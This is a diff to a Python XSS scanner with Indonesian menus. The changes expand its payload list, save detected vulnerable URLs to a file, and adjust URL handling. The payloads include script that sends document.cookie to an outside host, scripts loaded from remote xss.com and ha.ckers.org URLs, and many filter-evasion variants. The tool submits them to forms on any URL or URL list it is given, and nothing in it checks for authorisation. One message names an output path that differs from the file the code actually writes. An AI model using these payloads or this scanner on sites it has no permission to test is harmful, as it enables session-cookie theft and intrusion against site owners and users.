@@ -1,3 +1,4 @@
+import os
 import sys
 import requests
 from pprint import pprint
@@ -6,9 +7,9 @@ from urllib.parse import urljoin
 from colorama import Fore, Style
 
 print(
-    Fore.RED +
+    Fore.BLUE +
     """
-⠀⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
+⠀  ⠀⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
 ⠀⠀⠉⠀⠀⠀⡏⠀⢰⠃⠀⠀⠀⣿⡇⠀⢸⡀⠀⠀⠀⠀⢸⣸⡆⠀⠀⠀⠰⣌⣧⡆⠀⢷⡀⠀⠀⣄⢳⠀⠀⢣⠀⠀⠀⢸⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⡇⠀⠘⠀⠀⠀⢀⣿⣇⠀⠸⡇⣆⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⢹⣾⡇⠀⢸⢣⠀⠀⠘⣿⣇⠀⠈⢧⠀⠀⠘⠀⢠⠀⠀
 ⠀⠀⠀⠀⠀⢀⡇⠀⡀⠀⠀⠀⢸⠈⢻⡄⠀⢷⣿⠀⠀⠀⠀⢹⡏⣇⠀⣀⣀⠀⣿⣧⠀⢸⠾⣇⣠⣄⣸⣿⡄⠀⠘⡆⠀⠀⠀⠀⠆⠀
@@ -31,9 +32,7 @@ print(
 ⠛⠶⢾⣿⣽⣭⣽⣭⢹⣷⠀⢹⣦⣀⠀⠀⠀⠀⡄⠀⠀⣸⡀⠀⠀⠁⣰⣧⣽⠀⠀⠀⠀⢀⣴⣾⣿⣿⡟⣻⣿⣿⣿⣿⢠⣿⣧⡸⣷⣄
 ⠀⠀⠀⠈⠙⠿⣿⣿⣿⠏⠀⣾⣿⣿⣷⣦⣀⠀⢇⠀⠀⠈⠁⠀⣠⠔⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⣼⣿⠏⣷⡈⠉
 ⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⡆⠀⠀⠀⡾⠁⠀⠀⠀⣀⡴⠞⠛⣛⣿⡿⠿⠛⠛⠉⠉⠀⠀⠀⢰⣿⡿⠂⠈⠻⡄
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣤⡀⠀⠀⠀⠀⠀⠈⣳⠀⣿⠛⠻⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡯⠀⠀⠀⠀⠀
-                                                       
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘                          
     """ + Fore.RESET)
 
 print()
@@ -44,31 +43,36 @@ XSS_PAYLOADS = [
     "<script>alert('hi')</script>",
     "<img src=x onerror=alert('XSS')>",
     "<svg/onload=alert('XSS')>",
+    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
     "<body onload=alert('XSS')>",
     "<a href='javascript:alert(1)'>Click me</a>",
+    "<input type='text' value='\";alert(1);//'>",
     "<script>document.write('<img src=x onerror=alert(1)>')</script>",
-    "<script>fetch('http://yourserver.com?cookie=' + document.cookie)</script>",
+    "<script>fetch('https://google.com/' + document.cookie)</script>",
     "<marquee onstart=alert('XSS')>XSS</marquee>",
     "<style>body{background:url('x') no-repeat;}</style>",
     "<svg><script>alert('XSS')</script></svg>",
     "<script>console.log('XSS')</script>",
-    "<script>document.location='https://google.com/?cookie=' + document.cookie</script>",
+    "<script>document.location='https://google.com/' + document.cookie</script>",
     "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
     "<w contenteditable id=x onfocus=alert()>",
-    "<script>alert('XSS')</script>",
-    "<img src=x onerror=alert('XSS')>",
-    "<svg/onload=alert('XSS')>",
-    "<body onload=alert('XSS')>",
-    "<a href='javascript:alert(1)'>Click me</a>",
-    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
-    "<script>fetch('http://yourserver.com?cookie=' + document.cookie)</script>",
-    "<marquee onstart=alert('XSS')>XSS</marquee>",
-    "<style>body{background:url('x') no-repeat;}</style>",
-    "<svg><script>alert('XSS')</script></svg>",
-    "<script>console.log('XSS')</script>",
-    "<script>document.location='https://google.com/?cookie=' + document.cookie</script>",
-    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
-    "<w contenteditable id=x onfocus=alert()>",
+    "<h1>xss<h1>",
+    "<p>xss</p>",
+    "<x onmouseout=alert(1)>hover this! ",
+    "<<scr\0ipt/src=http://xss.com/xss.js></script",
+    "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
+    "<ScRIPT>console.log('XSS')</ScRIPT>",
+    "<marquee/onstart=alert()>",
+    "<video/poster/onerror=alert()>",
+    "<isindex/autofocus/onfocus=alert()>",
+    "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
+    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
+    "<script>for((i)in(self))eval(i)(1)</script>",
+    "<sCR<script>iPt>alert(1)</SCr</script>IPt>",
+    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+
 ]
 
 class MissingUrlException(Exception):
@@ -130,10 +134,11 @@ class BaseXSSScanner:
 
     def scan(self, url):
         """
-        Given a url, it prints all XSS vulnerable forms.
+        Given a url, it prints all XSS vulnerable forms and saves results.
         """
         forms = self._extract_forms(url)
         print(f"[+] Detected {len(forms)} forms on {url}.")
+        detected_xss = []
 
         for form in forms:
             form_details = self.get_form_details(form)
@@ -145,6 +150,16 @@ class BaseXSSScanner:
                     print(f"{Fore.RED}[+] XSS Detected on {url}{Style.RESET_ALL}")
                     print(f"[*] Form details:")
                     pprint(form_details)
+                    detected_xss.append(url)  # Simpan URL yang terdeteksi XSS
+        # Buat folder hasil jika belum ada
+        # Simpan hasil ke dalam file hasil.txt jika ada XSS yang terdeteksi
+        if detected_xss:
+            with open(os.path.join('vulnerable.txt'), 'a') as f:
+                for detected_url in detected_xss:
+                    f.write(detected_url + "\n")
+            print(f"{Fore.GREEN}[*] Hasil pemindaian XSS telah disimpan di folder 'hasil/hasil.txt'.{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}[*] Tidak ada XSS yang terdeteksi pada {url}.{Style.RESET_ALL}")
 
 class XSSGameScanner(BaseXSSScanner):
     def get_form_details(self, form):
@@ -167,8 +182,8 @@ def normalize_url(url):
     """
     Normalize the URL by adding http:// if no scheme is provided.
     """
-    if not url.startswith(('https://', 'https://')):
-        url = 'https://' + url
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
     return url
 
 def check_url_status(url):
@@ -176,7 +191,7 @@ def check_url_status(url):
     Check if the URL is reachable.
     """
     try:
-        response = requests.head(url, allow_redirects=True, timeout=5)
+        response = requests.head(url, allow_redirects=True, timeout=10)
         if response.status_code == 200:
             print(f"{Fore.GREEN}[+] {url} is active.{Style.RESET_ALL}")
             return True
@@ -190,9 +205,9 @@ def check_url_status(url):
 def main():
     print(f"{Fore.RED}[*] XSS Scanner Menu:{Style.RESET_ALL}")
     print("1. Scan URL")
-    print("2. Scan dari file list")
-    print("3. Cek status URL dari file list")
-    print("4. Keluar")
+    print("2. Scan list")
+    print("3. Host check")
+    print("4. quit/keluar")
 
     pilihan = input("Pilih menu: ")
 
@@ -202,7 +217,7 @@ def main():
         scanner = XSSGameScanner(url)
         scanner.scan(url)
     elif pilihan == "2":
-        file_name = input("Masukkan nama file (misalnya: urls.txt): ")
+        file_name = input("Masukkan nama file (misalnya: list.txt): ")
         try:
             with open(file_name, 'r') as file:
                 urls = file.readlines()
@@ -216,7 +231,7 @@ def main():
             print(f"{Fore.RED}[!] File {file_name} tidak ditemukan!{Style.RESET_ALL}")
     elif pilihan == "3":
         active_urls = []
-        file_name = input("Masukkan nama file (misalnya: urls.txt): ")
+        file_name = input("Masukkan nama file (misalnya: list.txt): ")
         try:
             with open(file_name, 'r') as file:
                 urls = file.readlines()
@@ -231,9 +246,9 @@ def main():
 
         # Simpan hasil URL aktif ke file
         if active_urls:
-            with open('active_urls.txt', 'w') as f:
+            with open('active-urls.txt', 'w') as f:
                 f.write("\n".join(active_urls))
-            print(f"{Fore.GREEN}[*] Hasil pengecekan URL aktif telah disimpan di active_urls.txt.{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[*] Hasil pengecekan URL aktif telah disimpan di active-urls.txt.{Style.RESET_ALL}")
         else:
             print(f"{Fore.YELLOW}[*] Tidak ada URL aktif ditemukan.{Style.RESET_ALL}")
 
